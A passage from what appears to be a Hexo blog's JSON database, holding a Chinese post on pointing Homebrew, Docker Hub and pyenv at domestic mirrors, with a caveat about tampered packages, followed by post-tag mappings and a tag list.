set-url origin git://mirrors.tuna.tsinghua.edu.cn/homebrew.git</span><br></pre></td></tr></table></figure>\n\n<p>homebrew-science或者homebrew-python也可以参考其页面进行修改。不过如果不是处于极其艰难的情况，不建议改这个，因为无法确保各个的软件包的hash未被篡改。</p>\n<p>homebrew大多数的软件源都是在homebrew.bintray.com上的，速度同样非常慢，<a href=\"http://ban.ninja/\">有人</a>也做了份国内镜像。</p>\n<p>设置环境变量:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export HOMEBREW_BOTTLE_DOMAIN=http://7xkcej.dl1.z0.glb.clouddn.com</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Docker-Hub\"><a href=\"#Docker-Hub\" class=\"headerlink\" title=\"Docker Hub\"></a>Docker Hub</h4><p>国内基本斗士要注册的，科大源有个反向代理，因为Docker配置比较麻烦，请具体参考<a href=\"https://lug.ustc.edu.cn/wiki/mirrors/help/docker\">Docker镜像使用帮助</a></p>\n<h4 id=\"pyenv\"><a href=\"#pyenv\" class=\"headerlink\" title=\"pyenv\"></a>pyenv</h4><p>同样设置环境变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PYTHON_BUILD_MIRROR_URL=&quot;http://pyenv.qiniudn.com/pythons/&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h4><p>对于这些第三方源，并不能完全保重其安全性，所以会存在一定的风险下载到经过篡改的软件包。</p>\n<h3 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h3><p>2017.01.21 更新多条源记录</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"clypxqmmh0005xrn53g1t31aj","tag_id":"clypxqmmj0007xrn59nhtb1hq","_id":"clypxqmmn000cxrn53t5bcrhu"},{"post_id":"clypxqmmi0006xrn52dvtf684","tag_id":"clypxqmmj0007xrn59nhtb1hq","_id":"clypxqmmp000gxrn5asjw8fwv"},{"post_id":"clypxqmmk0008xrn53le66f6i","tag_id":"clypxqmmp000fxrn545wqccrf","_id":"clypxqmms000oxrn5c58s3pw0"},{"post_id":"clypxqmmk0008xrn53le66f6i","tag_id":"clypxqmmr000jxrn5hkwq4cvq","_id":"clypxqmmt000qxrn55p02gedf"},{"post_id":"clypxqmmm000axrn526s810ft","tag_id":"clypxqmmr000jxrn5hkwq4cvq","_id":"clypxqmmt000txrn534dlga29"},{"post_id":"clypxqmmu000wxrn5774v49e2","tag_id":"clypxqmmt000rxrn51v9cevwf","_id":"clypxqmmu000yxrn5926chcdu"},{"post_id":"clypxqmmu000xxrn50cz35ud9","tag_id":"clypxqmmj0007xrn59nhtb1hq","_id":"clypxqmmv0011xrn5d9pxhl5s"},{"post_id":"clypxqmmp000hxrn5fnhb23q1","tag_id":"clypxqmmt000rxrn51v9cevwf","_id":"clypxqmmv0013xrn5c7tpbuj3"},{"post_id":"clypxqmmp000hxrn5fnhb23q1","tag_id":"clypxqmmu000vxrn5djax1qm4","_id":"clypxqmmw0016xrn5cx3375vb"},{"post_id":"clypxqmmq000ixrn56trvhddl","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmmw0018xrn5hqop5mld"},{"post_id":"clypxqmmr000kxrn52dx56ph8","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmmx001cxrn5d8rccy9t"},{"post_id":"clypxqmmt000sxrn59eevck4i","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmmy001gxrn55eqt134v"},{"post_id":"clypxqmmx001dxrn572nb9xf5","tag_id":"clypxqmmr000jxrn5hkwq4cvq","_id":"clypxqmmy001ixrn5dl14al6x"},{"post_id":"clypxqmmv0014xrn59edv9msk","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmmz001lxrn555hr3q6h"},{"post_id":"clypxqmmv0014xrn59edv9msk","tag_id":"clypxqmmx001exrn5dguncnah","_id":"clypxqmmz001nxrn515nk5wpq"},{"post_id":"clypxqmmy001kxrn5bgre7hf6","tag_id":"clypxqmmr000jxrn5hkwq4cvq","_id":"clypxqmn0001qxrn56724fkll"},{"post_id":"clypxqmmw0017xrn56mb5hyox","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmn0001sxrn5da9r5nsi"},{"post_id":"clypxqmmw0017xrn56mb5hyox","tag_id":"clypxqmmx001exrn5dguncnah","_id":"clypxqmn0001txrn5gdm54qsc"},{"post_id":"clypxqmmz001pxrn59ne4dpoa","tag_id":"clypxqmmt000rxrn51v9cevwf","_id":"clypxqmn0001uxrn5cokde8zx"},{"post_id":"clypxqmmz001pxrn59ne4dpoa","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmn0001vxrn5dc0l90lk"},{"post_id":"clypxqmmw0019xrn5as6ccqo7","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmn0001wxrn5htiihqgt"},{"post_id":"clypxqmmw0019xrn5as6ccqo7","tag_id":"clypxqmmx001exrn5dguncnah","_id":"clypxqmn0001xxrn50ym2drog"},{"post_id":"clypxqmn0001rxrn5a1kbftn9","tag_id":"clypxqmmv0010xrn5fwnn658l","_id":"clypxqmn0001yxrn5hy421feq"}],"Tag":[{"name":"Windows","_id":"clypxqmmj0007xrn59nhtb1hq"},{"name":"Flash","_id":"clypxqmmp000fxrn545wqccrf"},{"name":"Web","_id":"clypxqmmr000jxrn5hkwq4cvq"},{"name":"Mac","_id":"clypxqmmt000rxrn51v9cevwf"},{"name":"Android","_id":"clypxqmmu000vxrn5djax1qm4"},{"name":"Linux","_id":"clypxqmmv0010xrn5fwnn658l"},{"name":"Exploit","_id":"clypxqmmx001exrn5dguncnah"}]}}